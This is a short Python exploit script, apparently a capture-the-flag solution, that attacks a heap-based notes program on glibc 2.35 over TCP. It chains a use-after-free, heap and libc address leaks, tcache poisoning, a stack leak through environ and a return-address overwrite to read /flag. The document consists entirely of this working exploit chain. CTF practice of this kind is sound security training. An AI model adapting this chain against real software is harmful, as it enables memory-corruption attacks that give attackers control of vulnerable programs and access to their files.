from pwnx import Challenge, tcp


HOST = "challenge.example"
PORT = 31337

MAIN_ARENA_BIAS = 0x219CE0
HEAP_PAGE_BIAS = 0
ENVIRON_TO_RIP = 0x138
PATH_OFFSET = 0x6B0
SCRATCH_OFFSET = 0x7C0
POISON_NODES = (0x9E0, 0xC00)

x = Challenge("./chall", libc="./libc.so.6")

notes = x.heap.menu(
    b"> ",
    commands={"alloc": 1, "edit": 2, "show": 3, "free": 4, "finish": 5},
    prompts={"slot": b"idx: ", "size": b"size: ", "data": b"data: "},
)

h = x.heap(notes, glibc="2.35", slots=range(32))
uaf = h.uaf(read=notes.show, write=notes.edit)

heap = h.leak.safe_link(
    uaf, slot=0, size=0x100, bias=HEAP_PAGE_BIAS, tcache_empty=True
)
libc = h.leak.unsorted(
    uaf, slot=2, guard=3, size=0x500, bias=MAIN_ARENA_BIAS,
    arena_linked=True,
)

mem = h.tcache_poison(
    uaf,
    size=0x100,
    heap=heap,
    nodes=[heap + offset for offset in POISON_NODES],
)

path = h.store(b"/flag\x00", at=heap + PATH_OFFSET)
scratch = h.reserve(0x100, at=heap + SCRATCH_OFFSET)
stack = mem.read(x.libc.environ)
control = mem.return_address(stack - ENVIRON_TO_RIP, trigger=notes.finish)

x.want(x.read_file(path, size=0x100, scratch=scratch), via=control)
x.run(on=tcp(HOST, PORT))
